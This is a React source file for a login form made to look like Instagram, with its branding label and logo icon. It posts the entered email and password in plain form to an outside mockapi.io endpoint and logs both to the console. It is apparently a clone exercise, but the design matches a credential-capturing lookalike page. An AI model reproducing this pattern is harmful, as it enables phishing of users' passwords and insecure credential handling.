import React, { useEffect, useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { HiSun , HiMoon } from 'react-icons/hi';
import { VscEye , VscEyeClosed } from 'react-icons/vsc';
import axios from 'axios';

export default function Login() {

let navigate = useNavigate();
    const [mode, setMode] = useState(localStorage.getItem('mode'));
    const [modeicon, setModeicon] = useState(localStorage.getItem('modeicon') === 'HiMoon' ? <HiMoon className='fs-3 mb-1'/> : <HiSun  className='fs-3'/>);

  // Check if the user is already logged in
  useEffect(() => {
    if (!localStorage.getItem('mode')) {
      setMode('bg-light');
      setModeicon(<HiSun  className='fs-3 mb-1'/>);
    }
  }, []);

  const modechange = (e) => {
    e.preventDefault();

    if (mode === 'bg-light') {
      setMode('bg-dark');
      setModeicon(<HiMoon  className='fs-3 mb-1'/>);
      localStorage.setItem('mode', 'bg-dark');
      localStorage.setItem('modeicon', 'HiMoon');
    } else {
      setMode('bg-light');
      setModeicon(<HiSun  className='fs-3 mb-1'/>);
      localStorage.setItem('mode', 'bg-light');
      localStorage.setItem('modeicon', 'HiSun');
    }
  };

  const [mail, setMail] = useState("");
  const [password, setPassword] = useState("");
  const register = (e) => {
    if( mail != "" || password != ""){
    e.preventDefault();
    axios
      .post("https://64620fde185dd9877e4a080a.mockapi.io/api/v1/insta", {
        mail: mail,
        password: password,
      })
      .then((response) => {
        navigate("/");
      })
      .catch((err) => console.log(err.message));
    console.log(mail, password);
    }
  };

  const [eye, setEye] = useState(<VscEye />);
  const [typo, setTypo] = useState("password");

  const eyechange = (e) => {
    e.preventDefault();
    if (eye.type.name == "VscEye") {
      setEye(<VscEyeClosed />);
      setTypo("text");
    } else {
      setEye(<VscEye />);
      setTypo("password");

    }
  };

  

  return (
    <div className={mode}>

      <div className="login pt-lg-5 pt-sm-3 ">

      <label onClick={modechange} class="rounded-circle switch ms-auto m-2 me-4">
                  {modeicon}
              </label>

      <div class="containerz m-auto mt-lg-5">
    <div class="content">
      <i  role="img" class="log1" aria-label="Instagram" data-visualcompletion="css-img"></i>
      <form onSubmit={register} class="content__form">
        <div class="content__inputs">
          <label>
            <input value={mail} onChange={(e)=> setMail(e.target.value)} required="" placeholder='Email' type="email"/>
            
          </label>
          <label>
            <input value={password} onChange={(e)=> setPassword(e.target.value)} required="" placeholder='Password' type={typo}/>
            <span className='fs-1 cursor' onClick={eyechange}>{eye}</span>
          </label>
        </div>
        <button type='Submit'>Sign up</button>
      </form>
      <div class="content__or-text">
        <span></span>
        <span>OR</span>
        <span></span>
      </div>
      <div class="content__forgot-buttons">
      <Link to="/"><button>Log in</button></Link>
        <button>Forgot password?</button>
      </div>
    </div>
  </div>
  </div>
  
    </div>
  )
}
